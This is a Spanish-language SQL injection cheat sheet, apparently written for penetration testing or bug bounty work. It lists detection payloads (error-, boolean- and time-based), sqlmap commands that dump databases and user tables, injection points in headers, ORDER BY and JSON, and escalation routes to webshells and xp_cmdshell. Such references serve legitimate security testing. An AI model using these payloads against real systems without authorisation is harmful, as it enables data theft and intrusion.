# SQLi — SQL Injection

## Señales de entrada
- Inputs reflejados en queries: búsqueda, filtros, IDs, login.
- Errores de base de datos en respuesta.
- Diferencias de comportamiento al inyectar `'`, `"`, `--`.
- Tiempos de respuesta variables con payloads de sleep.
- Parámetros de ordenación (`sort=`, `order=`, `column=`).

## Metodología

### Detección básica
```sql
-- Error-based
'
"
'--
'/*
') OR 1=1--

-- Boolean-based
' AND 1=1--   vs   ' AND 1=2--

-- Time-based
'; WAITFOR DELAY '0:0:5'--   (MSSQL)
' AND SLEEP(5)--              (MySQL)
'; SELECT pg_sleep(5)--       (PostgreSQL)
```

### Con sqlmap (automatizado)
```bash
# Básico
sqlmap -u "https://example.com/item?id=1" --dbs

# Con sesión autenticada
sqlmap -u "https://example.com/api/search" \
  --data='{"query":"test"}' \
  --headers="Authorization: Bearer TOKEN" \
  --level=5 --risk=3 --dbs

# Dump tabla concreta
sqlmap -u "URL" -D database_name -T users --dump
```

### Casos especiales
- SQLi en cabeceras: `User-Agent`, `X-Forwarded-For`, `Referer`.
- SQLi en ORDER BY: `sort=name` → `sort=name,(SELECT SLEEP(5))`.
- SQLi en JSON body: `{"id": "1 OR 1=1"}`.
- Second-order SQLi: input guardado y ejecutado en otra operación.

## Impacto alto
- Dump de base de datos completa (usuarios, hashes, PII).
- Bypass de autenticación.
- Lectura de ficheros del sistema (`LOAD_FILE`).
- Escritura de ficheros / webshell (`INTO OUTFILE`).
- RCE en algunos casos (xp_cmdshell en MSSQL).

## Evidencia mínima
- Diferencia de comportamiento booleano probada.
- O error SQL visible en respuesta.
- O sleep confirmado con tiempo de respuesta.
- Para impacto alto: datos extraídos reales (usar tabla no sensible).
